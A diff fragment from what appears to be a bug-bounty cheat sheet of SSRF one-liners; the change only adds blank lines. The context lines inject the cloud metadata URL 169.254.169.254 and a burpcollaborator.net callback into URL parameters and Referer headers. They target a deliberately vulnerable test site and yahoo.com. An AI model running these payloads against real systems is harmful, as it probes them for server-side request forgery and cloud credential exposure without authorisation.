@@ -49,7 +49,10 @@ gau -subs testphp.vulnweb.com | grep "=" | qsreplace "http://169.254.169.254/lat
 **BLIND ssrf:**
 
 gau -subs testphp.vulnweb.com | gf ssrf | qsreplace "http://burpcollaborator.net" | httpx -silent -proxy http://127.0.0.1:8080
+
 subfinder -d yahoo.com -silent | httpx -silent -proxy http://127.0.0.1:8080 -H "Referer: http://burpcollaborator.net"
+
+
 
 
 Command:
